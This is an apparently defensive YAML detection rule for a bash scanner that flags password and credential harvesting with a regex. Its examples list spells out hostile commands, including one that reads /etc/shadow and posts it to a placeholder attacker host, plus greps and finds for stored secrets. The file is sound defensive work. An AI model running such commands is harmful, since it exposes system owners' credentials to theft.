# Bash Pattern: Password and Credential Harvesting
# Detects attempts to harvest passwords from files

id: BASH-007
name: Password and Credential Harvesting
description: |
  Detects attempts to search for and extract passwords or credentials from
  configuration files, environment variables, and common credential storage
  locations. Attackers grep for passwords in files, dump environment variables,
  and search common credential locations. Pattern requires exfiltration indicators
  (curl, wget, nc, base64) or recursive searches to reduce FPs from audit scripts.
languages:
  - bash
detection_type: regex
# Require exfiltration indicators (curl, wget, nc, base64) combined with credential access
# Simple credential checks without exfil are common in audit/admin scripts
detection_logic: 'cat\s+/etc/shadow.*(?:curl|wget|nc|base64)|cat\s+/etc/passwd.*(?:curl|wget|nc\s)|grep\s+-r.*(?:password|passwd).*2>/dev/null|env\s*\|\s*grep.*(?:PASS|KEY|TOKEN|SECRET).*(?:curl|wget|nc\s)|find.*\.(?:aws|kube|docker).*xargs'
severity: High
mitre_technique: T1552.001
confidence: 0.7
category: credential_access
enabled: true
paranoia_levels:
  - 1
  - 2
  - 3
metadata:
  author: Script Sentinel Team
  created: "2025-11-17"
  updated: "2025-11-17"
  references:
    - "https://attack.mitre.org/techniques/T1552/001/"
    - "https://attack.mitre.org/techniques/T1552/"
  tags:
    - bash
    - credential-harvesting
    - password-theft
    - reconnaissance
  examples:
    - "grep -r 'password' /home/ 2>/dev/null"
    - "cat /etc/shadow | curl -X POST http://attacker.com/creds"
    - "env | grep -i 'pass\\|key\\|token\\|secret'"
    - "find / -name '.aws' -o -name 'credentials' 2>/dev/null"